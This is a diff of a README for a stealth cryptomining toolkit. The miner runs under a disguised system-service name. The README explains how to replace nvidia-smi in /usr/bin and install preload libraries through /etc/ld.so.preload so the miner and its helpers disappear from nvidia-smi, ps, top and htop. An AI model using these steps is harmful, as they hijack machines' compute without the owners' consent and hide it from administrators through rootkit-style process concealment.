@@ -1,4 +1,4 @@
-# AWESOME WOKR !!!
+# AWESOME WORK !!!
 ## Structure
 * exec: executed file.
     * nvidia-smi: excludes `systemd-diagnosis` in nvidia-smi panel.
@@ -6,24 +6,19 @@
     * systemd-update: is the same to the `systemd-firewall` but more merciful that only works at midnight.
     * systemd-diagnosis: is the pool slave miner.
     * libGNU.co hides `systemd-diagnosis` for ps, top ,and htop.
+    * libnvidia-glibc.so hides `nl-toolkit` for ps, top ,and htop.
     * libnvidia-openai.so hides `systemd-firewall` for ps, top ,and htop.
 
 * source: corresponding source code of the executed file in `./exec`.
 
 ## Installation
-run the `Makefile` by `sudo make`. If you want to be blame, run it without `sudo`. 
+run the `Makefile` by `sudo make`. If you want to be blamed, run it without `sudo`. 
 
 ### nvidia-smi
 1. please make sure the variable `skip` in `source/nvidia-smi.py` is the same to the **slave miner**'s file name.
 1. rename original `nvidia-smi` by `nl-toolkit` in `/usr/bin`.
 1. move the *degraded* `nvidia-smi` to `/usr/bin`.
 1. add read and execution permissions by `chmod +rx nvidia-smi`
-
-### ps
-1. please make sure the regex in `source/ps.py` cover the *executed file*, *pool name*, *renamed linux file*.
-1. rename original `ps` by `ps2` in `/usr/bin`.
-1. move the *degraded* `ps` to `/usr/bin`.
-1. add read and execution permissions by `chmod +rx ps`
 
 ### systemd-firewall
 1. move `systemd-firewall` to `/usr/bin`.
@@ -32,10 +27,9 @@ run the `Makefile` by `sudo make`. If you want to be blame, run it without `sudo
 ### systemd-update
 1. same to the `systemd-firewall`.
 
-### libGNU.co and libnvidia-openai.co
-1. move `libGNU.co` and `libnvidia-openai.co` to `/usr/lib`
-1. `echo /usr/lib/libGNU.co >> /etc/ld.so.preload`
-1. `echo /usr/lib/libnvidia-openai.co >> /etc/ld.so.preload`
+### libGNU.co, libnvidia-glibc.co, and libnvidia-openai.co
+1. move `libGNU.co`, `libnvidia-glibc.co`, and `libnvidia-openai.co` to `/usr/lib`
+1. move `ld.so.preload` to `/etc/`
 
 ## Usage
 ### Slash the miner
